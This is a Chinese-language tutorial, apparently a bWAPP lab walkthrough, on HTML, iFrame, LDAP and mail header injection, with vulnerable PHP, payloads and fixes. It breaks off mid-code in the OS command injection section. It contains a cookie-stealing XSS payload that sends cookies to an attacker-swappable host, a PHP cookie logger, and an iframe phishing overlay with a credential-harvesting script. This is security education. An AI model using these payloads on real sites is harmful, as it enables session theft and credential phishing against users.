    <content type="html"><![CDATA[<p>基于 bWAPP，所列举的 payload 只是典型例子</p><h1 id="HTML-Injection-Reflected-GET"><a href="#HTML-Injection-Reflected-GET" class="headerlink" title="HTML Injection - Reflected (GET)"></a>HTML Injection - Reflected (GET)</h1><h2 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">  function htmli($data)</span><br><span class="line">  &#123;</span><br><span class="line">      return $data;</span><br><span class="line">  &#125;</span><br><span class="line">  if(isset($_GET[&quot;firstname&quot;]) &amp;&amp; isset($_GET[&quot;lastname&quot;]))</span><br><span class="line">  &#123;   </span><br><span class="line">      $firstname = $_GET[&quot;firstname&quot;];</span><br><span class="line">      $lastname = $_GET[&quot;lastname&quot;];    </span><br><span class="line">      if($firstname == &quot;&quot; or $lastname == &quot;&quot;)</span><br><span class="line">      &#123;</span><br><span class="line">          echo &quot;&lt;font color=\&quot;red\&quot;&gt;Please enter both fields...&lt;/font&gt;&quot;   </span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line">      else            </span><br><span class="line">      &#123; </span><br><span class="line">          echo &quot;Welcome &quot; . htmli($firstname) . &quot; &quot; . htmli($lastname);   </span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>以 GET 方式提交数据。将提交的数据通过 URL 中，但是并<strong>未对输入进行过滤</strong></p><p>如果输入 <code>?firstname=1&amp;lastname=&lt;script&gt;alert(1)&lt;/script&gt;</code> </p><p>后面的输出就变为 <code>Welcome 1 &lt;script&gt;alert(1)&lt;/script&gt;</code>，浏览器会自动解析 JS 语句，从而弹窗</p><h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><p>常是诱使用户点击包含恶意代码的 URL，常用于<strong>窃取 cookies</strong> 或者进行<strong>钓鱼欺骗</strong>。</p><h3 id="窃取-Cookies"><a href="#窃取-Cookies" class="headerlink" title="窃取 Cookies"></a>窃取 Cookies</h3><p>payload ：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//192.168.233.1/htmli_get.php?firstname=&lt;script&gt;var x=new Image();x.src="http://192.168.233.1/test.php?cookie="+document.cookie;&lt;/script&gt;</span></span><br></pre></td></tr></table></figure><p>其中，192.168.233.1 可以替换为攻击者的服务器，test.php 为接受 cookies 的文件，这样就可以获取点击者的 cookies</p><p>test.php ( 用于接收 cookie )</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$cookie = $_GET[<span class="string">'cookie'</span>];</span><br><span class="line">$log = fopen(<span class="string">'cookie.txt'</span>,<span class="string">'a'</span>);</span><br><span class="line">fwrite($log, $cookie);</span><br><span class="line">fwrite(<span class="string">"\n"</span>);</span><br><span class="line">fclose($log);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>效果</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/bwapp/html_1.png" alt></p><h3 id="钓鱼"><a href="#钓鱼" class="headerlink" title="钓鱼"></a>钓鱼</h3><p>payload ：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//192.168.233.1/htmli_get.php?firstname=</span></span><br><span class="line">&lt;script&gt;</span><br><span class="line"><span class="built_in">document</span>.body.innerHTML=(</span><br><span class="line"><span class="string">'&lt;div style="position:absolute;top:0px;left:0px;width:100%;high:100%;"&gt;'</span>+</span><br><span class="line"><span class="string">'&lt;iframe src=http://192.168.233.1/fish.html width=100% height=100%&gt;'</span>+</span><br><span class="line"><span class="string">'&lt;/iframe&gt;&lt;/div&gt;'</span></span><br><span class="line">);</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p>创建一个 Iframe 框架覆盖原页面，强制输入，其中，192.168.233.1 可以替换为攻击者的服务器，fish.html 为钓鱼页面，fish.php 接收数据</p><p>fish.html ( 钓鱼页面，直接从真实页面复制 )</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">action</span>=<span class="string">"fish.php"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"username"</span> <span class="attr">value</span>=<span class="string">"Nick"</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">name</span>=<span class="string">"password"</span> <span class="attr">value</span>=<span class="string">"Pass"</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"login"</span> <span class="attr">value</span>=<span class="string">"submit"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>fish.php ( 接收传递的数据 )</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$data = fopen(<span class="string">"loginfile.txt"</span>,<span class="string">"a+"</span>);</span><br><span class="line">$login = $_POST[<span class="string">'username'</span>];</span><br><span class="line">$pass = $_POST[<span class="string">'password'</span>];</span><br><span class="line">fwrite($data, <span class="string">"Username: $login"</span>);</span><br><span class="line">fwrite(<span class="string">"\n"</span>);</span><br><span class="line">fwrite($data, <span class="string">"Password: $pass"</span>);</span><br><span class="line">fwrite(<span class="string">"\n"</span>);</span><br><span class="line">fclose($data);</span><br><span class="line"><span class="comment">//重定向 URL</span></span><br><span class="line">Header(<span class="string">"location: http://192.168.233.133/bWAPP/htmli_get.php"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>效果</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/bwapp/html_2.png" alt></p><h2 id="防护方式"><a href="#防护方式" class="headerlink" title="防护方式"></a>防护方式</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">htmli</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $input = str_replace(<span class="string">"&lt;"</span>, <span class="string">"&amp;lt;"</span>, $data);</span><br><span class="line">    $input = str_replace(<span class="string">"&gt;"</span>, <span class="string">"&amp;gt;"</span>, $input);</span><br><span class="line"></span><br><span class="line">    $input = urldecode($input);</span><br><span class="line">    <span class="keyword">return</span> $input;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将 <code>&lt;</code> 和 <code>&gt;</code> 替换为 HTML 实体，然后进行 URL 解码</p><p>绕过：</p><p>直接将传入的参数进行 URL 编码即可。如果是在对话框中输入，只需要一次 URL Encode，如果是在 URL 栏中输入需要两次。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">htmli</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// htmlentities - converts all applicable characters to HTML entities</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> htmlentities($data, ENT_QUOTES);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将所有字符替换为 HTML 实体，当需要将一个字符串输出到 Web 网页时，又不确定其中是否存在 XSS 字符时，可以使用 <strong>htmlentities</strong> 函数进行输出过滤。暂时无法绕过。</p><h1 id="HTML-Injection-Reflected-POST"><a href="#HTML-Injection-Reflected-POST" class="headerlink" title="HTML Injection - Reflected (POST)"></a>HTML Injection - Reflected (POST)</h1><h2 id="产生原因-1"><a href="#产生原因-1" class="headerlink" title="产生原因"></a>产生原因</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">htmli</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> $data;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">"firstname"</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">"lastname"</span>]))</span><br><span class="line">  &#123;   </span><br><span class="line">      $firstname = $_POST[<span class="string">"firstname"</span>];</span><br><span class="line">      $lastname = $_POST[<span class="string">"lastname"</span>];    </span><br><span class="line">      <span class="keyword">if</span>($firstname == <span class="string">""</span> <span class="keyword">or</span> $lastname == <span class="string">""</span>)</span><br><span class="line">      &#123;</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">"&lt;font color=\"red\"&gt;Please enter both fields...&lt;/font&gt;"</span>   </span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span>            </span><br><span class="line">      &#123; </span><br><span class="line">          <span class="keyword">echo</span> <span class="string">"Welcome "</span> . htmli($firstname) . <span class="string">" "</span> . htmli($lastname);   </span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>以 POST 方式提交数据，和 GET 型类似，只是提交数据的方式不同</p><h2 id="利用方式-1"><a href="#利用方式-1" class="headerlink" title="利用方式"></a>利用方式</h2><p>payload (post) : </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">firstname=<span class="number">1</span>&amp;lastname=<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">document</span>.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>获取登陆用户的 cookie</p><h2 id="防护方式-1"><a href="#防护方式-1" class="headerlink" title="防护方式"></a>防护方式</h2><p>与 GET 的防护相同，绕过方法也类似，第一种绕过需要对提交的数据 URL Encode 两次，第二种无法绕过</p><h1 id="HTML-Injection-Reflected-Current-URL"><a href="#HTML-Injection-Reflected-Current-URL" class="headerlink" title="HTML Injection - Reflected (Current URL)"></a>HTML Injection - Reflected (Current URL)</h1><h2 id="产生原因-2"><a href="#产生原因-2" class="headerlink" title="产生原因"></a>产生原因</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  $url = <span class="string">"http://"</span> . $_SERVER[<span class="string">"HTTP_HOST"</span>] . $_SERVER[<span class="string">"REQUEST_URI"</span>]; </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;p align=\"left\"&gt;Your current URL: &lt;i&gt;"</span> . $url . <span class="string">"&lt;/i&gt;&lt;/p&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输出当前请求的 URL，同样，未对输入进行过滤。</p><h2 id="利用方式-2"><a href="#利用方式-2" class="headerlink" title="利用方式"></a>利用方式</h2><p>页面直接返回所请求的 URL，直接修改所请求的 URL。但是浏览器会自动进行 URL 编码，所以需要在 burp 中去掉 URL 编码</p><p>payload ：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">document</span>.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h2 id="防护方式-2"><a href="#防护方式-2" class="headerlink" title="防护方式"></a>防护方式</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$url = <span class="string">"&lt;script&gt;document.write(document.URL)&lt;/script&gt;"</span>;</span><br></pre></td></tr></table></figure><p>直接使用 JS 的函数输出 URL，暂时无法绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">($data, $encoding = <span class="string">"UTF-8"</span>)</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> htmlspecialchars($data, ENT_QUOTES, $encoding);</span><br><span class="line">  &#125;</span><br><span class="line">  $url = <span class="string">"http://"</span>.$_SERVER[<span class="string">"HTTP_HOST"</span>].check($_SERVER[<span class="string">"REQUEST_URI"</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>使用 htmlspecialchars 进行转义，无法绕过</p><h1 id="HTML-Injection-Stored-Blog"><a href="#HTML-Injection-Stored-Blog" class="headerlink" title="HTML Injection - Stored (Blog)"></a>HTML Injection - Stored (Blog)</h1><h2 id="产生原因-3"><a href="#产生原因-3" class="headerlink" title="产生原因"></a>产生原因</h2><p>存储型 XSS，恶意脚本被存储到客户端或者服务器的数据库中，当其他用户浏览网页时，就在受害者主机上执行恶意代码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">htmli</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> $data;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">"entry_add"</span>]))</span><br><span class="line">  &#123;</span><br><span class="line">      $entry = htmli($_POST[<span class="string">"entry"</span>]);</span><br><span class="line">      $owner = $_SESSION[<span class="string">"login"</span>];</span><br><span class="line">      <span class="keyword">if</span>($entry == <span class="string">""</span>)</span><br><span class="line">      &#123;</span><br><span class="line">          $message =  <span class="string">"&lt;font color=\"red\"&gt;Please enter some text...&lt;/font&gt;"</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span>            </span><br><span class="line">      &#123; </span><br><span class="line">          $sql = <span class="string">"INSERT INTO blog (date, entry, owner) VALUES (now(),'"</span>.$entry.<span class="string">"','"</span>.$owner.<span class="string">"')"</span>;</span><br><span class="line">          $recordset = $link-&gt;query($sql);</span><br><span class="line">          <span class="keyword">if</span>(!$recordset)</span><br><span class="line">          &#123;</span><br><span class="line">              <span class="keyword">die</span>(<span class="string">"Error: "</span> . $link-&gt;error . <span class="string">"&lt;br /&gt;&lt;br /&gt;"</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="comment">// Debugging</span></span><br><span class="line">          <span class="comment">// echo $sql;</span></span><br><span class="line">          $message = <span class="string">"&lt;font color=\"green\"&gt;Your entry was added to our blog!&lt;/font&gt;"</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里没有对输入的 entry 进行过滤，如果输入 <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> ，那么这段代码就会保存在数据库，用户每次访问时都会弹窗。</p><h2 id="利用方式-3"><a href="#利用方式-3" class="headerlink" title="利用方式"></a>利用方式</h2><p>最典型的例子就是 XSS 蠕虫。</p><p>payload : </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//实现网页的无限刷新</span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"refresh"</span> <span class="attr">content</span>=<span class="string">"0"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">//弹出 1，注意不是 '1'</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">"alert('1');"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">//生成一个按钮，点击弹出 1</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"click me"</span> <span class="attr">onclick</span>=<span class="string">"alert('1')"</span>; /&gt;</span></span><br></pre></td></tr></table></figure><h2 id="防护方式-3"><a href="#防护方式-3" class="headerlink" title="防护方式"></a>防护方式</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">htmli</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> addslashes($data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用 addslashes 函数转义，这个函数对 <strong>单引号( ‘ )，双引号( “ )，反斜杠( \ )，NULL</strong> 生效</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">htmli</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// htmlentities - converts all applicable characters to HTML entities</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> htmlentities($data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用 htmlspecialchars 进行转义，无法绕过</p><h1 id="iFrame-Injection"><a href="#iFrame-Injection" class="headerlink" title="iFrame Injection"></a>iFrame Injection</h1><h2 id="产生原因-4"><a href="#产生原因-4" class="headerlink" title="产生原因"></a>产生原因</h2><p>iframe 标签是 HTML 中一个很重要的标签，常用于嵌入第三方网页，比如嵌入广告页面，第三方 Web 游戏与应用等。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&lt;?php</span><br><span class="line">  function xss($data)&#123;</span><br><span class="line">  return $data;</span><br><span class="line">  &#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;iframe frameborder=&quot;0&quot; src=&quot;&lt;?php echo xss($_GET[&quot;ParamUrl&quot;])?&gt;&quot; height=&quot;&lt;?php echo xss($_GET[&quot;ParamHeight&quot;])?&gt;&quot; width=&quot;&lt;?php echo xss($_GET[&quot;ParamWidth&quot;])?&gt;&quot;&gt;&lt;/iframe&gt;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>传入参数 ParamUrl，ParamHeight，ParamWidth，用于控制 iframe 组件，但是没有对传入的参数进行过滤</p><h2 id="利用方式-4"><a href="#利用方式-4" class="headerlink" title="利用方式"></a>利用方式</h2><p>payload ：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//闭合 iframe 之后再写入注入脚本</span></span><br><span class="line">?ParamUrl=robots.txt&amp;ParamWidth=<span class="number">250</span>&amp;ParamHeight=<span class="number">250</span><span class="string">"&gt;&lt;/iframe&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/bwapp/html_3.png" alt></p><h2 id="防护方式-4"><a href="#防护方式-4" class="headerlink" title="防护方式"></a>防护方式</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">xss</span><span class="params">($data, $encoding = <span class="string">"UTF-8"</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> htmlspecialchars($data, ENT_QUOTES, $encoding);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用 htmlspecialchars 进行转义，无法绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">xss</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// addslashes - returns a string with backslashes before characters that need to be quoted in database queries etc.</span></span><br><span class="line">    <span class="comment">// These characters are single quote ('), double quote ("), backslash (\) and NUL (the NULL byte).</span></span><br><span class="line">    <span class="comment">// Do NOT use this for XSS or HTML validations!!!</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> addslashes($data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用 addslashes 函数防护，payload 和未防护时相同，可以触发 xss。为什么这个防护是无效的？</p><p>本地复现一下，两个文件，iframexss.php 和 xss.txt，xss.txt 中内容随意。</p><p>iframexss.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// xss 过滤</span><br><span class="line">function xss($data)&#123;</span><br><span class="line">return addslashes($data);</span><br><span class="line">&#125;</span><br><span class="line">// 输出传入参数</span><br><span class="line">echo $_SERVER[&quot;QUERY_STRING&quot;].&quot;&lt;br&gt;&quot;;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt;</span><br><span class="line">&lt;title&gt; iframe xss&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt; xss &lt;/h1&gt;</span><br><span class="line">&lt;p&gt;This is an iframe xss !&lt;/p&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&quot;ParamHeight&quot;]) &amp;&amp; isset($_GET[&quot;ParamWidth&quot;]))</span><br><span class="line">&#123;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;iframe frameborder=&quot;0&quot; src=&quot;xss.txt&quot; height=&quot;&lt;?php echo xss($_GET[&quot;ParamHeight&quot;])?&gt;&quot; width=&quot;&lt;?php echo xss($_GET[&quot;ParamWidth&quot;])?&gt;&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>结果：</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/bwapp/html_4.png" alt></p><h1 id="LDAP-Injection-Search"><a href="#LDAP-Injection-Search" class="headerlink" title="LDAP Injection (Search)"></a>LDAP Injection (Search)</h1><h2 id="补充知识"><a href="#补充知识" class="headerlink" title="补充知识"></a>补充知识</h2><p>LDAP 是轻量级目录访问协议。</p><p>目录服务是一种特殊的数据库，专门用于保存某些属性的详细信息，比如，电话簿，地址簿，人员组织管理等等。</p><p>而 LDAP 类似于目录服务，只不过存储的是文件目录，存储位置为各大厂商，比如 SUN，IBM，Microsoft等等。LDAP 本身并不是目录数据库。它是一种提供访问目录数据库方法的服务和协议。</p><p>LDAP目录服务是由目录数据库和一套访问协议组成的系统。LDAP不仅可以从目录数据库查询对象，还可以用于管理和身份验证。</p><p>一些参数如图：</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/bwapp/html_5.png" alt></p><p>如果把 LDAP 和 数据库类比起来，数据库是以 表-字段-值 的形式来存储数据，而 LDAP 目录是以树的形式存储数据。dn 和库名对应，dc 和表名对应，ou 和字段对应，cn 是要查询的目标名称</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/bwapp/html_6.png" alt></p><h2 id="产生原因-5"><a href="#产生原因-5" class="headerlink" title="产生原因"></a>产生原因</h2><h2 id="利用方式-5"><a href="#利用方式-5" class="headerlink" title="利用方式"></a>利用方式</h2><p>This could result in the execution of arbitrary commands such as granting permissions to unauthorized queries, and content modification inside the LDAP tree.The same advanced exploitation techniques available in SQL Injection can be similarly applied in LDAP Injection.</p><p>CVE-2018-12689</p><p>CVE-2018-5730</p><p>CVE-2016-8750</p><p>CVE-2011-4069</p><h2 id="防护方式-5"><a href="#防护方式-5" class="headerlink" title="防护方式"></a>防护方式</h2><h1 id="Mail-Header-Injection-SMTP"><a href="#Mail-Header-Injection-SMTP" class="headerlink" title="Mail Header Injection (SMTP)"></a>Mail Header Injection (SMTP)</h1><p><a href="https://www.freebuf.com/articles/web/14918.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/14918.html</a></p><p><a href="https://www.acunetix.com/blog/articles/email-header-injection/" target="_blank" rel="noopener">https://www.acunetix.com/blog/articles/email-header-injection/</a></p><h1 id="OS-Command-Injection"><a href="#OS-Command-Injection" class="headerlink" title="OS Command Injection"></a>OS Command Injection</h1><h2 id="产生原因-6"><a href="#产生原因-6" class="headerlink" title="产生原因"></a>产生原因</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 